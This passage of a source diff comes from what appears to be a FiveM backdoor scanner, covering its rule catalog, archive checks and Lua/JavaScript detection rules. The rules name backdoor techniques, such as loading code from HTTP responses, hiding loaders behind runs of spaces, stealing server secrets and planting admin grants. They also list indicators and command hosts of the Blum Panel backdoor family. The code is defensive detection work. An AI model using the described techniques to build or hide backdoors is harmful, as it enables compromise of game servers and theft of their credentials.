+          "label": "Secure your events (docs.fivem.net)",
+          "url": "https://docs.fivem.net/docs/developers/server-security/"
+        }
+      ]
+    },
+    "LAB-SEC-103": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "Obfuscated data in the code",
+      "fix": "Long escaped-byte, base64 or hex strings and long string.char lists hide what the code does. Check what they decode to.",
+      "refs": []
+    },
+    "LAB-SEC-104": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "Reads a server secret",
+      "fix": "A resource has no reason to read the license key or RCON password; database credentials only belong in the database resource. Find out where the value goes.",
+      "refs": [
+        {
+          "label": "Secure your events (docs.fivem.net)",
+          "url": "https://docs.fivem.net/docs/developers/server-security/"
+        }
+      ]
+    },
+    "LAB-SEC-105": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "HTTP request to a raw IP or a hidden address",
+      "fix": "Legitimate integrations call named, documented hosts. Find out who runs the address and what is sent there.",
+      "refs": []
+    },
+    "LAB-SEC-106": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "Runs shell commands or writes outside its own resource",
+      "fix": "os.execute and io.popen run programs on the host; writing other resources' files is how backdoors spread. Keep file writes inside GetResourcePath(GetCurrentResourceName()).",
+      "refs": [
+        {
+          "label": "Scripting in Lua (docs.fivem.net)",
+          "url": "https://docs.fivem.net/docs/scripting-manual/runtimes/lua/"
+        }
+      ]
+    },
+    "LAB-SEC-107": {
+      "severity": "error",
+      "confidence": "confirmed",
+      "method": "pattern",
+      "title": "Code hidden behind a long run of spaces",
+      "fix": "Legitimate code is never pushed out of view. This is how a known FiveM backdoor hides a loader that runs remote code on player clients: delete the hidden part and treat the package as compromised.",
+      "refs": [
+        {
+          "label": "Secure your events (docs.fivem.net)",
+          "url": "https://docs.fivem.net/docs/developers/server-security/"
+        }
+      ]
+    },
+    "LAB-SEC-108": {
+      "severity": "warning",
+      "confidence": "likely",
+      "method": "pattern",
+      "title": "Ships a credential",
+      "fix": "Someone's token, webhook or key is in the download, so every buyer gets it. Replace it with an empty value and let the server owner enter their own.",
+      "refs": []
+    },
+    "LAB-PKG-004": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "package",
+      "title": "Executable or system script in the package",
+      "fix": "FXServer never needs .exe, .dll, .bat, .cmd, .ps1, .sh, .vbs, .jar or .scr files to run a resource. A C# resource (one that contains a *.net.dll) may ship .dll assemblies; those are not flagged. Don't run the others; ask the author why they are included.",
+      "refs": []
+    },
+    "LAB-PKG-005": {
+      "severity": "warning",
+      "confidence": "confirmed",
+      "method": "package",
+      "title": "Archive entry with an unsafe path",
+      "fix": "Entries with '..', absolute paths or drive letters can write outside the folder they are extracted to. They were skipped; extract the archive with a tool that refuses them.",
+      "refs": []
+    },
+    "LAB-SEC-109": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "Grants server permissions to a fixed identifier",
+      "fix": "add_principal / add_ace for one named license, Steam or Discord ID puts a person into your admin group from inside a script. If you did not put it there, remove it and treat the package as compromised.",
+      "refs": [
+        {
+          "label": "Secure your events (docs.fivem.net)",
+          "url": "https://docs.fivem.net/docs/developers/server-security/"
+        }
+      ]
+    },
+    "LAB-SEC-110": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "Runs code that an event delivers",
+      "fix": "load() on an event argument lets anyone who can trigger that event run code on this side. Remove it; a legitimate resource passes data, not code.",
+      "refs": [
+        {
+          "label": "Secure your events (docs.fivem.net)",
+          "url": "https://docs.fivem.net/docs/developers/server-security/"
+        }
+      ]
+    },
+    "LAB-SEC-111": {
+      "severity": "warning",
+      "confidence": "heuristic",
+      "method": "pattern",
+      "title": "JavaScript runs fetched or decoded text",
+      "fix": "eval, new Function and vm.run* on downloaded or decoded text is how a JavaScript backdoor loads its payload. Read the reported line; legitimate resources do not need it.",
+      "refs": [
+        {
+          "label": "Secure your events (docs.fivem.net)",
+          "url": "https://docs.fivem.net/docs/developers/server-security/"
+        }
+      ]
+    },
+    "LAB-SEC-112": {
+      "severity": "warning",
+      "confidence": "likely",
+      "method": "pattern",
+      "title": "Known backdoor indicator",
+      "fix": "This string or manifest entry is documented for the Blum / Warden / Cipher Panel backdoor. Treat the package as compromised: remove the resource, reinstall txAdmin, and rotate the license key, RCON and database passwords.",
+      "refs": [
+        {
+          "label": "Blum Panel analysis and indicators",
+          "url": "https://github.com/ImJer/blum-panel-fivem-backdoor-analysis"
+        }
+      ]
+    }
+  }
+}
+
+```
+
+`src/archive.js`:
+
+```js
+// Archive entry names: executables a resource does not need, and paths that escape the extraction folder.
+// Names only; nothing is inflated or executed.
+const EXECUTABLE = /\.(?:exe|dll|bat|cmd|ps1|sh|vbs|jar|scr)$/i;
+/** `..` segments, absolute paths, backslashes or drive letters: extracting these can write outside the target folder. */
+const UNSAFE_PATH = (n) => n.startsWith("/") || n.includes("\\") || /^[a-z]:/i.test(n) || n.split("/").includes("..");
+/** Archive entries no resource needs (executables) or that escape the folder (unsafe paths). Names only, nothing inflated. */
+export function archiveRisks(names) {
+    const all = names.filter((n) => !n.endsWith("/"));
+    // macOS metadata (`__MACOSX/…/._x.exe` next to a real x.exe) is not an executable of its own; a path escape is one
+    // wherever it is (`__MACOSX/../../x` writes outside the folder too).
+    const entries = all.filter((n) => !(n.startsWith("__MACOSX/") && n.split("/").at(-1).startsWith("._")));
+    // C# resources ship their assemblies (*.net.dll plus referenced .dll files); FXServer loads them, so they're expected there.
+    const csharp = entries.some((n) => /\.net\.dll$/i.test(n));
+    return {
+        executables: entries.filter((n) => EXECUTABLE.test(n) && !(csharp && /\.dll$/i.test(n))),
+        unsafePaths: all.filter(UNSAFE_PATH),
+    };
+}
+
+```
+
+`src/index.js`:
+
+```js
+export { archiveRisks } from "./archive.js";
+export { LIMITS, MAX_FILE, MAX_SCAN_ZIP, decodeSource, plan, verdictOf } from "./limits.js";
+export { scanPath } from "./path.js";
+export { RULES, RULESET_VERSION, finding, securityRules, sortFindings } from "./rules.js";
+export { scanEntries, scanFiles, scanZip } from "./scan.js";
+
+```
+
+`src/limits.js`:
+
+```js
+export const MAX_SCAN_ZIP = 300 * 1024 * 1024;
+export const MAX_FILE = 2 * 1024 * 1024;
+const MAX_TEXT = 120 * 1024 * 1024;
+const SCANNED = /\.(?:lua|js)$/i;
+const utf8 = new TextDecoder("utf-8", { fatal: true, ignoreBOM: true });
+// Lua reads source as bytes: Latin-1 maps every byte to one character, so nothing is dropped from the checks.
+const latin1 = new TextDecoder("latin1");
+/** File bytes as the checks see them, the same for ZIP entries and picked files. */
+export function decodeSource(bytes) {
+    try {
+        return utf8.decode(bytes);
+    }
+    catch {
+        return latin1.decode(bytes);
+    }
+}
+/** The limits a report lists. */
+export const LIMITS = ["escrowed", "unreadable", "javascript", "unparsed", "skipped", "archives"];
+export function verdictOf(r) {
+    if (r.findings.some((f) => f.severity === "error"))
+        return "hidden";
+    if (r.findings.length)
+        return "suspicious";
+    return r.scanned === 0 || LIMITS.some((k) => r[k].length) ? "partial" : "clean";
+}
+// Directories only. macOS metadata (`._x`, `__MACOSX/`) is recognised by its content, not its name (scan.ts).
+export const ignored = (name) => name.endsWith("/");
+/** Which entries to read: Lua/JS within the size limits. Shared by ZIP uploads and folder picks. */
+export function plan(entries) {
+    const skipped = [];
+    let total = 0;
+    const wanted = entries
+        .filter((e) => !ignored(e.name) && SCANNED.test(e.name))
+        .filter((e) => {
+        total += e.size;
+        if (e.size <= MAX_FILE && total <= MAX_TEXT)
+            return true;
+        skipped.push(e.name);
+        return false;
+    })
+        .map((e) => e.name);
+    return { wanted: new Set(wanted), skipped };
+}
+
+```
+
+`src/lua.js`:
+
+```js
+// Lua parsing helpers. FiveM's CfxLua accepts syntax luaparse (Lua 5.3) rejects; it is rewritten to plain Lua of the
+// same length first, so line numbers stay right.
+import luaparse from "luaparse";
+
+const longBracket = (src, i) => /^\[(=*)\[/.exec(src.slice(i, i + 64));
+
+/** Splits Lua source into code, strings ('…', "…", [[…]]), backtick hashes, comments and C-style comments. */
+export function luaSpans(src) {
+  const spans = [];
+  let start = 0;
+  let i = 0;
+  const push = (kind, end) => {
+    if (start < i) spans.push({ kind: "code", text: src.slice(start, i) });
+    spans.push({ kind, text: src.slice(i, end) });
+    i = start = end;
+  };
+  const closeLong = (from, eq) => {
+    const end = src.indexOf(`]${eq}]`, from);
+    return end < 0 ? src.length : end + eq.length + 2;
+  };
+  while (i < src.length) {
+    const c = src[i];
+    if (c === "/" && src[i + 1] === "*") {
+      const end = src.indexOf("*/", i + 2);
+      push("ccomment", end < 0 ? src.length : end + 2);
+    } else if (c === "-" && src[i + 1] === "-") {
+      const long = longBracket(src, i + 2);
+      push("comment", long ? closeLong(i + 2 + long[0].length, long[1]) : src.indexOf("\n", i) + 1 || src.length);
+    } else if (c === '"' || c === "'" || c === "`") {
+      let j = i + 1;
+      while (j < src.length && src[j] !== c && src[j] !== "\n") j += src[j] === "\\" ? 2 : 1;
+      push(c === "`" ? "hash" : "string", Math.min(j + 1, src.length));
+    } else if (c === "[" && longBracket(src, i)) {
+      const long = longBracket(src, i);
+      push("string", closeLong(i + long[0].length, long[1]));
+    } else i++;
+  }
+  if (start < src.length) spans.push({ kind: "code", text: src.slice(start) });
+  return spans;
+}
+
+const ATTRIB = /<\s*(?:const|close)\s*>/g;
+const COMPOUND = /(?:\/\/|<<|>>|\.\.|[-+*/%^&|])=(?!=)/g;
+const SAFE_NAV = /\?(?=[.[:])/g;
+export const toPlainLua = (source) =>
+  luaSpans(source)
+    .map((s) =>
+      s.kind === "hash"
+        ? s.text.length > 1 && s.text.endsWith("`") ? `"${s.text.slice(1, -1)}"` : s.text
+        : s.kind === "ccomment"
+          ? s.text.replace(/[^\n]/g, " ")
+          : s.kind !== "code"
+            ? s.text
+            : s.text
+                .replace(ATTRIB, (m) => " ".repeat(m.length))
+                .replace(COMPOUND, (m) => `${" ".repeat(m.length - 1)}=`)
+                .replace(SAFE_NAV, " "),
+    )
+    .join("");
+
+export const parseLua = (source) => luaparse.parse(toPlainLua(source), { luaVersion: "5.3", locations: true });
+
+/** `a.b.c` / `a.b:c` → ["a", "b", "c"]; null when any part isn't a plain identifier. */
+export function memberPath(e) {
+  if (e.type === "Identifier") return [e.name];
+  if (e.type !== "MemberExpression") return null;
+  const base = memberPath(e.base);
+  return base && [...base, e.identifier.name];
+}
+
+const isNode = (v) => typeof v === "object" && v !== null && typeof v.type === "string";
+
+/** Depth-first over every node. */
+export function walk(node, visit) {
+  visit(node);
+  for (const [key, value] of Object.entries(node)) {
+    if (key === "loc" || key === "range") continue;
+    if (Array.isArray(value)) {
+      for (const v of value) if (isNode(v)) walk(v, visit);
+    } else if (isNode(value)) walk(value, visit);
+  }
+}
+
+/** String literal content, read from raw (luaparse leaves `value` empty for non-Latin-1 text). */
+export const stringValue = (raw) => (/^['"]/.test(raw) ? raw.slice(1, -1) : raw.replace(/^\[=*\[\n?|\]=*\]$/g, ""));
+
+```
+
+`src/path.js`:
+
+```js
+import { readdirSync, readFileSync, statSync } from "node:fs";
+import { basename, join, relative, sep } from "node:path";
+import { decodeSource, MAX_SCAN_ZIP, plan } from "./limits.js";
+import { scanEntries, scanFiles, scanZip } from "./scan.js";
+
+// Not `stream`: asset folders can hold Lua too, and a backdoor in one is still a backdoor.
+const SKIP_DIRS = new Set(["node_modules", ".git"]);
+
+function walk(root) {
+  const out = [];
+  const visit = (dir) => {
+    let entries;
+    try {
+      entries = readdirSync(dir, { withFileTypes: true });
+    } catch (e) {
+      throw new Error(`cannot read ${dir}: ${e instanceof Error ? e.message : e}`);
+    }
+    for (const ent of entries) {
+      if (ent.isSymbolicLink()) continue;
+      const full = join(dir, ent.name);
+      if (ent.isDirectory()) {
+        if (!SKIP_DIRS.has(ent.name)) visit(full);
+      } else if (ent.isFile()) out.push({ name: relative(root, full).split(sep).join("/"), full, size: statSync(full).size });
+    }
+  };
+  visit(root);
+  return out;
+}
+
+function scanFolder(root) {
+  const entries = walk(root);
+  const { wanted, skipped } = plan(entries.map((e) => ({ name: e.name, size: e.size })));
+  const files = {};
+  const unreadable = [];
+  for (const entry of entries) {
+    if (!wanted.has(entry.name)) continue;
+    try {
+      files[entry.name] = decodeSource(new Uint8Array(readFileSync(entry.full)));
+    } catch {
+      unreadable.push(entry.name);
+    }
+  }
+  return scanEntries(entries.map((e) => e.name), files, { unreadable, skipped });
+}
+
+/**
+ * A resource folder, a whole server folder, a ZIP or one file. Rejects with "too_large" / "invalid_zip" / "cannot read …"
+ * when the scan could not run; a report is never a guess.
+ */
+export async function scanPath(target) {
+  let st;
+  try {
+    st = statSync(target);
+  } catch {
+    throw new Error(`cannot read ${target}`);
+  }
+  if (st.isDirectory()) return scanFolder(target);
+  if (!st.isFile()) throw new Error(`cannot read ${target}`);
+  if (target.toLowerCase().endsWith(".zip")) {
+    if (st.size > MAX_SCAN_ZIP) throw new Error("too_large");
+    return scanZip(new Uint8Array(readFileSync(target)));
+  }
+  return scanFiles({ [basename(target)]: decodeSource(new Uint8Array(readFileSync(target))) });
+}
+
+```
+
+`src/rules.js`:
+
+```js
+// The backdoor checks of the RPScripts FiveM Backdoor Scanner (https://rpscripts.net/tools/fivem-backdoor-scanner/).
+// Static only: files are parsed, never run. Codes never change meaning; same codes as the web scanner's reports.
+import { readFileSync } from "node:fs";
+import { memberPath, parseLua, stringValue, walk } from "./lua.js";
+
+// Rule texts live in rules/catalog.json, the same entries as the web scanner's rule catalog.
+const catalog = JSON.parse(readFileSync(new URL("../rules/catalog.json", import.meta.url), "utf8"));
+export const RULESET_VERSION = catalog.rulesetVersion;
+export const RULES = catalog.rules;
+
+/** A finding with the rule's texts from the catalog. Codes never change meaning; retired rules keep their code unused. */
+export function finding(code, message, at = {}, extraRefs = []) {
+  const rule = RULES[code];
+  if (!rule) throw new Error(`unknown rule ${code}`);
+  return { code, ...rule, message, ...at, refs: [...rule.refs, ...extraRefs], ruleVersion: RULESET_VERSION };
+}
+
+const ORDER = { error: 0, warning: 1, info: 2 };
+export const sortFindings = (list) =>
+  [...list].sort((a, b) => ORDER[a.severity] - ORDER[b.severity] || (a.path ?? "").localeCompare(b.path ?? "") || (a.line ?? 0) - (b.line ?? 0));
+
+const isCall = (n) => n.type === "CallExpression" || n.type === "StringCallExpression" || n.type === "TableCallExpression";
+const argsOf = (c) => (c.type === "CallExpression" ? c.arguments : c.type === "StringCallExpression" ? [c.argument] : [c.arguments]);
+const calleeOf = (c) => memberPath(c.base)?.join(".") ?? null;
+const lastOf = (name) => name.slice(name.lastIndexOf(".") + 1);
+const literal = (e) => (e?.type === "StringLiteral" ? stringValue(e.raw) : null);
+const lineOf = (n) => n.loc?.start.line;
+
+function calls(root) {
+  const out = [];
+  walk(root, (n) => {
+    if (isCall(n)) out.push({ call: n, name: calleeOf(n) });
+  });
+  return out;
+}
+
+const ESCAPE = /\\(?:x[0-9a-fA-F]{2}|\d{1,3})/g;
+/** Escaped bytes in one literal from which it counts as hidden text (a few \n-style escapes are normal). */
+const MIN_ESCAPES = 40;
+/** base64 or hex without spaces, this long, is data or code, not text. */
+const BLOB = /^(?:[A-Za-z0-9+/]{400,}={0,2}|[0-9a-fA-F]{400,})$/;
+/** string.char(…) with this many arguments spells out text byte by byte. */
+const MIN_CHAR_ARGS = 20;
+const DECODER = /(?:decode|unhex|fromhex|base64|b64|deobf)/i;
+const SECRET = /^(?:sv_licenseKey|rcon_password|sv_tebexSecret)$/i;
+const DB_SECRET = /^mysql_connection_string$/i;
+// A literal URL whose host is a public IPv4 address (private ranges and loopback are local services).
+const IP_URL = /^(?:https?:)?\/\/(?!(?:127|10|0)\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)\d{1,3}(?:\.\d{1,3}){3}(?:[:/?]|$)/i;
+const HTTP = new Set(["PerformHttpRequest", "PerformHttpRequestAwait"]);
+const LOADERS = new Set(["load", "loadstring"]);
+// `add_principal identifier.license:<hex> …` / `add_ace identifier.…` with a hard-coded person: an admin planted in the file.
+const GRANT = /\badd_(?:principal|ace)\s+identifier\.[a-z0-9]+:[0-9a-f]{6,}/i;
+const JS_FILE = /\.(?:[cm]?js)$/i;
+const JS_RUN = /\b(?:eval|runIn(?:This|New)Context)\s*\(|\bnew\s+(?:Function|vm\.Script)\s*\(/;
+const JS_NET = /\b(?:fetch|axios|got)\s*\(|\bhttps?\.(?:get|request)\s*\(|require\(\s*['"](?:node:)?https?['"]\s*\)|\bXMLHttpRequest\b/;
+const JS_DECODE = /\batob\s*\(|String\.fromCharCode|\bunescape\s*\(/;
+// Tested apart: the base64 literal between them can be any length and span lines.
+const JS_BASE64_FROM = /Buffer\.from\s*\(/;
+const JS_BASE64 = /['"]base64['"]/;
+const JS_PROCESS = /require\(\s*['"](?:node:)?child_process['"]\s*\)|from\s+['"](?:node:)?child_process['"]/;
+
+/** A string built only from literals (`"lo".."ad"`), else null. */
+function folded(e) {
+  if (e?.type === "StringLiteral") return stringValue(e.raw);
+  if (e?.type === "BinaryExpression" && e.operator === "..") {
+    const left = folded(e.left);
+    const right = folded(e.right);
+    return left !== null && right !== null ? left + right : null;
+  }
+  return null;
+}
+
+/** Names that stand for load/loadstring: `local run = loadstring`, `_G.load`, `_G["lo".."ad"]`, aliases of aliases. */
+function loaderNames(root) {
+  const names = new Set(LOADERS);
+  const global = (b) => b.type === "Identifier" && (b.name === "_G" || b.name === "_ENV");
+  const isLoader = (e) =>
+    e.type === "Identifier" ? names.has(e.name)
+    : e.type === "MemberExpression" ? global(e.base) && LOADERS.has(e.identifier.name)
+    : e.type === "IndexExpression" ? global(e.base) && LOADERS.has(folded(e.index) ?? "")
+    : false;
+  walk(root, (n) => {
+    if (n.type === "LocalStatement" || n.type === "AssignmentStatement")
+      n.init.forEach((e, i) => {
+        const v = n.variables[i];
+        if (v?.type === "Identifier" && isLoader(e)) names.add(v.name);
+      });
+  });
+  return names;
+}
+
+// JavaScript has no parser here: text checks only. Runs fetched or decoded text, or starts programs on the host.
+function jsRules(path, source) {
+  const out = [];
+  const run = JS_RUN.exec(source);
+  if (run && (JS_NET.test(source) || JS_DECODE.test(source) || (JS_BASE64_FROM.test(source) && JS_BASE64.test(source))))
+    out.push(finding("LAB-SEC-111", "This JavaScript runs text with eval/new Function/vm and also fetches or decodes text.", { path, line: lineAt(source, run.index) }));
+  const proc = JS_PROCESS.exec(source);
+  if (proc) out.push(finding("LAB-SEC-106", "child_process runs programs on the server's host.", { path, line: lineAt(source, proc.index) }));
+  return out;
+}
+
+const escapes = (raw) => raw.match(ESCAPE)?.length ?? 0;
+
+/** Text decoded at runtime: string.char, decoder functions or literals written as escaped bytes. */
+function hidden(e) {
+  let found = false;
+  walk(e, (n) => {
+    if (found) return;
+    if (n.type === "StringLiteral" && escapes(n.raw) >= 8) found = true;
+    if (isCall(n)) {
+      const name = calleeOf(n);
+      if (name === "string.char" || (name && DECODER.test(lastOf(name)))) found = true;
+    }
+  });
+  return found;
+}
+
+// Code pushed far past the right edge by a long run of spaces: how a known FiveM backdoor family hides its loader.
+// A comment after the gap is no code. The run is matched atomically (lookahead + backreference) so a long run without
+// code after it cannot backtrack quadratically. Blanks are Lua's in-line whitespace: space, tab, \v, \f.
+const HIDDEN_CODE = /(?<![ \t\v\f])(?=([ \t\v\f]{400,}))\1(?!--|\/\/|\/\*)\S/;
+
+const lineAt = (source, index) => source.slice(0, index).split("\n").length;
+
+function hiddenCode(path, source) {
+  const m = HIDDEN_CODE.exec(source);
+  return m ? [finding("LAB-SEC-107", "Code continues after a long run of spaces, out of view in any editor.", { path, line: lineAt(source, m.index) })] : [];
+}
+
+// Credential shapes precise enough to be real, never placeholders like "YOUR_TOKEN". The value is never echoed.
+const CREDENTIALS = [
+  ["a Discord bot token", /(?<![\w.-])[MNO][\w-]{23,27}\.[\w-]{6}\.[\w-]{27,40}(?![\w-])/],
+  ["a Discord webhook URL", /discord(?:app)?\.com\/api\/webhooks\/\d{15,20}\/[\w-]{30,}/],
+  ["a Cfx license key", /\bcfxk_[A-Za-z0-9]{20,}/],
+  ["a GitHub token", /\bgh[pousr]_[A-Za-z0-9]{36}\b/],
+];
+
+function shippedCredentials(path, source) {
+  return CREDENTIALS.flatMap(([kind, re]) => {
+    const m = re.exec(source);
+    return m ? [finding("LAB-SEC-108", `${path} contains ${kind}. Whoever has the file can use it.`, { path, line: lineAt(source, m.index) })] : [];
+  });
+}
+
+// Indicators of the Blum / Warden / Cipher / GFX Panel family (github.com/ImJer/blum-panel-fivem-backdoor-analysis,
+// iocs 2026.08.07): C2 hosts, operator handles and keys, txAdmin tampering markers. Exact strings only; left out as too
+// common: "ggWP" alone, decompressFromUTF16 (lz-string), the dropper file names (main.js, index.js, …).
+const BLUM_HOSTS =
+  "0xchitado.com 2312321321321213.com 2nit32.com 2ns3.net 5mscripts.net 9ns1.com bhlool.com blum-panel.com blum-panel.me bybonvieux.com cipher-panel.me ciphercheats.com dark-utilities.xyz fivemgtax.com fivems.lt flowleakz.org gfxpanel.org giithub.net iwantaticket.org jking.lt keyx.club kutingplays.com l00x.org monloox.com noanimeisgay.com ryenz.net spacedev.fr trezz.org useer.it.com warden-panel.me wsichkidolu.com z1lly.org";
+const BLUM = new RegExp(
+  String.raw`(?<![\w-])(?:${BLUM_HOSTS.replaceAll(".", String.raw`\.`).replaceAll(" ", "|")})(?![\w-])|(?<![A-Za-z])[bB]ert[jJ][jJ]|miaus(?:s|as)|GlobalState\.ggWP|txadmin:js_create|\b(?:helpEmptyCode|onServerResourceFail|RESOURCE_EXCLUDE|isExcludedResource|JohnsUrUncle|installed_notices|VB8mdVjrzd|UARZT6|1470175544682217685|(?:anon|blum|city|dev|gang|mafia|null|panel|roleplay|zXeAH)JJ)\b`,
+);
+// A manifest entry that the family smuggles in: a .js after a commented-out entry and a run of spaces, a .js dot file
+// (`html/.env.js`), or a .js under `node_modules/.…`. `./x.js`, `../x.js` and build folders like `.next/` are ordinary.
+// Both run per line on lines up to MANIFEST_LINE characters: on a whole file they are quadratic (review 2026-11-10).
+const MANIFEST_DECOY = /--\[=*\[.*?\]=*\][ \t]{20,}['"][^'"]*\.js['"]/;
+const MANIFEST_DOT = /(['"])(?:(?:[^'"]*[\\/])?\.[^'"\\/*]+\.js|(?:[^'"]*[\\/])?node_modules[\\/]\.[^'"]*\.js)\1/;
+const MANIFEST_LINE = 2000;
+const uncommented = (line) => line.replace(/--\[=*\[.*?\]=*\]/g, "").replace(/--.*$/, "");
+const MANIFEST = /(?:^|\/)(?:fxmanifest|__resource)\.lua$/;
+
+function knownBackdoor(path, source) {
+  const at = (m) => ({ path, line: lineAt(source, m.index) });
+  const out = [];
+  const ioc = /\.(?:lua|[cm]?js)$/i.test(path) ? BLUM.exec(source) : null;
+  if (ioc) out.push(finding("LAB-SEC-112", `Contains '${ioc[0]}', an indicator of the Blum Panel backdoor family.`, at(ioc)));
+  if (MANIFEST.test(path)) {
+    const line = source.split("\n").findIndex((l) => l.length <= MANIFEST_LINE && (MANIFEST_DECOY.test(l) || MANIFEST_DOT.test(uncommented(l))));
+    if (line >= 0) out.push(finding("LAB-SEC-112", "The manifest loads a JavaScript file from a hidden place (a dot file, node_modules/.…, or after a commented-out entry).", { path, line: line + 1 }));
+  }
+  // Luraph's header is a comment, which the parser drops; the code below it can't be read by any static check.
+  const luraph = path.toLowerCase().endsWith(".lua") ? /Luraph Obfuscator/.exec(source) : null;
+  if (luraph) out.push(finding("LAB-SEC-103", "This file is obfuscated with Luraph.", at(luraph)));
+  return out;
+}
+
+/** A loader call and the arguments it gets, also through `pcall(load, code)` / `xpcall(load, handler, code)`. */
+function loadCall(call, name, loaders) {
+  const args = argsOf(call);
+  if (name && loaders.has(name)) return { name, args };
+  const skip = name === "pcall" ? 1 : name === "xpcall" ? 2 : 0;
+  const fn = args[0];
+  return skip && fn?.type === "Identifier" && loaders.has(fn.name) ? { name: fn.name, args: args.slice(skip) } : null;
+}
+
+function luaRules(path, chunk) {
+  const out = [];
+  const list = calls(chunk);
+  const http = list.filter(({ name }) => name && HTTP.has(name));
+  const loaders = loaderNames(chunk);
+  const remote = new Set();
+  // io.popen('ls "…"') / ('dir "…" /b') to list a folder is common in legitimate loaders.
+  let lists = false;
+  walk(chunk, (n) => {
+    if (n.type === "StringLiteral" && /^(?:ls|dir)(?:\s|$)/.test(stringValue(n.raw))) lists = true;
+  });
+
+  // Code loaded inside an HTTP response handler: `PerformHttpRequest(url, function(_, body) assert(load(body))() end)`.
+  for (const { call } of http)
+    for (const fn of argsOf(call).filter((a) => a.type === "FunctionDeclaration"))
+      for (const inner of calls(fn)) {
+        const run = loadCall(inner.call, inner.name, loaders);
+        if (run) {
+          remote.add(inner.call);
+          out.push(finding("LAB-SEC-101", `${run.name}() runs the body of an HTTP response: whoever controls that server can run any code on yours.`, { path, line: lineOf(inner.call) }));
+        }
+      }
+
+  for (const { call, name } of list) {
+    if (!name) continue;
+    const args = argsOf(call);
+    const run = loadCall(call, name, loaders);
+    if (run && !remote.has(call) && run.args[0] && hidden(run.args[0]))
+      out.push(finding("LAB-SEC-102", `${run.name}() runs text that is only decoded at runtime.`, { path, line: lineOf(call) }));
+    if ((name === "GetConvar" || name === "GetConvarInt") && args[0]) {
+      const convar = literal(args[0]);
+      if (convar && (SECRET.test(convar) || (DB_SECRET.test(convar) && http.length > 0)))
+        out.push(finding("LAB-SEC-104", `Reads the convar '${convar}'${http.length ? " in a file that also sends HTTP requests" : ""}.`, { path, line: lineOf(call) }));
+    }
+    if (HTTP.has(name) && args[0] && hidden(args[0]))
+      out.push(finding("LAB-SEC-105", "The address of this HTTP request is only decoded at runtime.", { path, line: lineOf(call) }));
+    if (name === "ExecuteCommand" && GRANT.test(literal(args[0]) ?? ""))
+      out.push(finding("LAB-SEC-109", "ExecuteCommand grants server permissions to a hard-coded identifier.", { path, line: lineOf(call) }));
+    if (name === "os.execute" || (name === "io.popen" && !lists))
+      out.push(finding("LAB-SEC-106", `${name} runs a program on the server's host.`, { path, line: lineOf(call) }));
+    if (name === "io.open" && /^[wa]|\+/.test(literal(args[1]) ?? "") && !JSON.stringify(args[0] ?? null).includes("GetResourcePath"))
+      out.push(finding("LAB-SEC-106", "io.open writes to a path that isn't built from GetResourcePath(…).", { path, line: lineOf(call) }));
+  }
+
+  // A handler that runs the text its event delivers: whoever can trigger the event runs code on this side.
+  for (const { call, name } of list) {
+    if (!name || !(name === "RegisterNetEvent" || name === "RegisterServerEvent" || name === "AddEventHandler")) continue;
+    for (const fn of argsOf(call).filter((x) => x.type === "FunctionDeclaration")) {
+      const params = new Set(fn.parameters.flatMap((x) => (x.type === "Identifier" ? [x.name] : [])));
+      for (const inner of calls(fn)) {
+        const run = loadCall(inner.call, inner.name, loaders);
+        const arg = run?.args[0];
+        if (run && arg?.type === "Identifier" && params.has(arg.name))
+          out.push(finding("LAB-SEC-110", `${run.name}() runs text delivered by an event.`, { path, line: lineOf(inner.call) }));
+      }
+    }
+  }
+
+  // SaveResourceFile into a resource computed at runtime (e.g. every resource from GetResourceByFindIndex): how
+  // backdoors spread. A literal resource name is explicit and not reported.
+  const own = new Set();
+  walk(chunk, (n) => {
+    if (n.type === "LocalStatement" || n.type === "AssignmentStatement")
+      n.init.forEach((e, i) => {
+        const v = n.variables[i];
+        if (v?.type === "Identifier" && isCall(e) && calleeOf(e) === "GetCurrentResourceName") own.add(v.name);
+      });
+  });
+  for (const { call, name } of list) {
+    if (name !== "SaveResourceFile") continue;
+    const target = argsOf(call)[0];
+    const mine =
+      !target ||
+      (isCall(target) && calleeOf(target) === "GetCurrentResourceName") ||
+      (target.type === "Identifier" && own.has(target.name)) ||
+      literal(target) !== null;
+    if (!mine) out.push(finding("LAB-SEC-106", "SaveResourceFile writes into a resource that may not be this one.", { path, line: lineOf(call) }));
+  }
+
+  // Obfuscated data and raw-IP addresses: one finding per file, at the first occurrence.
+  const first = {};
+  walk(chunk, (n) => {
+    if (n.type === "StringLiteral") {
+      const value = stringValue(n.raw);
+      const count = escapes(n.raw);
+      if (count >= MIN_ESCAPES) first.blob ??= { line: lineOf(n), what: `a string of ${count} escaped bytes` };
+      if (BLOB.test(value)) first.blob ??= { line: lineOf(n), what: `a ${value.length}-character base64/hex string` };
+      if (http.length && IP_URL.test(value)) first.ip ??= { line: lineOf(n), url: value.slice(0, 60) };
+    }
+    if (isCall(n) && calleeOf(n) === "string.char" && argsOf(n).length >= MIN_CHAR_ARGS) first.blob ??= { line: lineOf(n), what: `string.char with ${argsOf(n).length} bytes` };
+  });
+  if (first.blob) out.push(finding("LAB-SEC-103", `This file contains ${first.blob.what}.`, { path, line: first.blob.line }));
+  if (first.ip) out.push(finding("LAB-SEC-105", `A file that sends HTTP requests contains the raw-IP address '${first.ip.url}'.`, { path, line: first.ip.line }));
+  return out;
+}
+
+/**
+ * All checks on one file. Hidden code and credentials are looked for in any text file; the Lua checks need a parse.
+ * `parsed: false` = the Lua did not parse, so only the text checks ran.
+ */
+export function securityRules(path, source) {
+  const text = [...hiddenCode(path, source), ...shippedCredentials(path, source), ...knownBackdoor(path, source)];
+  if (JS_FILE.test(path)) return { findings: [...text, ...jsRules(path, source)], parsed: true };
+  if (!path.toLowerCase().endsWith(".lua")) return { findings: text, parsed: true };
+  try {
+    return { findings: [...luaRules(path, parseLua(source)), ...text], parsed: true };
+  } catch {
+    return { findings: text, parsed: false };
+  }
+}
+
+```
+
+`src/scan.js`:
+
+```js
+// Backdoor checks over every Lua and JavaScript file in an upload (one resource, a category folder or a whole server).
+// Only the per-file security checks run; archive-level checks look at entry names.
+import { archiveRisks } from "./archive.js";
